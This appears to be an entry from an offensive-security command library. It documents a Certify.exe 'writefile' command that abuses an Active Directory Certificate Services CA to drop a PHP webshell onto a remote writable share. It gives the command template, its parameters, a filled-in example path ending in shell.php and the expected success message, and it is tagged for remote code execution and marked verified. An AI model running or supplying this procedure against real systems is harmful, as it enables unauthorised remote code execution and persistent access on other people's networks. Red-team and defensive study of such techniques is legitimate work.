---
type: command
executor: powershell
data: 'Certify.exe writefile /ca:$_CA_NAME /path:$_REMOTE_PATH /input:$_INPUT_FILE'
output: null
platforms:
  - Windows
tags:
  - adcs
  - rce
  - webshell
verified: true
validated: true
---

# certify-write-php-shell-remote

## Command

```powershell
Certify.exe writefile /ca:$_CA_NAME /path:$_REMOTE_PATH /input:$_INPUT_FILE
```

## Description

Writes a custom PHP webshell to a remote writable share via CDP.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /ca:$_CA_NAME | Target CA | Yes |
| /path:$_REMOTE_PATH | Remote path (e.g., \\remote.server\share\shell.php) | Yes |
| /input:$_INPUT_FILE | Local path to shell file | Yes |

## Examples

### Basic Usage

```powershell
Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input:C:\Local\path\shell.php
```

## Expected Output

"File written to remote path successfully."

## Related

- [[procedures/Vulnerable-Certificate-Authority-Access-Control]]
